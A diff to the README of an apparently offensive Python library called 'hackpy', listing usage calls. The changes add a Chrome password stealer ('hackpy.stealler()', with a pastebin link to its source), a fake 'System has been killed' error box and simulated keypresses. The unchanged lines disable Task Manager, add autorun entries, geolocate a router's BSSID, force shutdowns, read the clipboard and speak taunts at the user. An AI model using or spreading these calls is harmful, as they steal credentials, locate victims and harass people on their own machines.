@@ -1,4 +1,4 @@
-![Python](https://www.python.org/static/img/python-logo@2x.png)
+﻿![Python](https://www.python.org/static/img/python-logo@2x.png)
 # `pip install hackpy`
 ![](https://picua.org/images/2019/07/02/a565a62aa7c27eb1339c6cb0be7c9d49.png)
 
@@ -15,8 +15,8 @@ hackpy.taskmanager.enable()  # Enable windows taskmgr.exe
 
 # TaskManager
 if hackpy.taskmanager.find('iexplore.exe') == True: # If process iexplore.exe found:
-	  hackpy.taskmanager.kill('iexplore.exe') # Stop iexplore.exe process,
-	  hackpy.taskmanager.start('chrome.exe') # start chrome.exe process
+    hackpy.taskmanager.kill('iexplore.exe') # Stop iexplore.exe process,
+    hackpy.taskmanager.start('chrome.exe') # start chrome.exe process
 
 
 # Autorun
@@ -45,15 +45,25 @@ bssid_string = hackpy.router() # BETA
 data = hackpy.bssid_locate(bssid_string)
 print('LATITUDE: ' + str(data['lat']) + ', LONGITUDE: ' + str(data['lon']) + ', RANGE: ' + str(data['range']))
 
+# Windows messagebox:
+hackpy.messagebox.error('LOL', 'System has been killed :D') # none, info, error and warning types
+
 # Nircmdc reference: https://nircmd.nirsoft.net
 hackpy.command.nircmdc('monitor off')
 hackpy.command.nircmdc('speak text \"HAHAHAHAHHAH IM FIND YOU!\"')
 # System commands
-hackpy.command.system('shutdown -s -t 0')
+hackpy.command.system('shutdown -s -t 260')
+
+# SendKeyPress:
+hackpy.sendkey('Hello bro{ENTER}')
+#Other keys: https://pastebin.com/Ns3P7UiH
 
 # Get text from clipboard:
 data = hackpy.clipboard.get()
 print('Text in clipboard is ' + data)
+
+# Save all Сhrome passwords to passwords.txt
+hackpy.stealler() # Stealler source code: https://pastebin.com/V28aPdZH
 
 # Set text to clipboard:
 hackpy.clipboard.set('Hello from LimerBoy and HackPy!!')
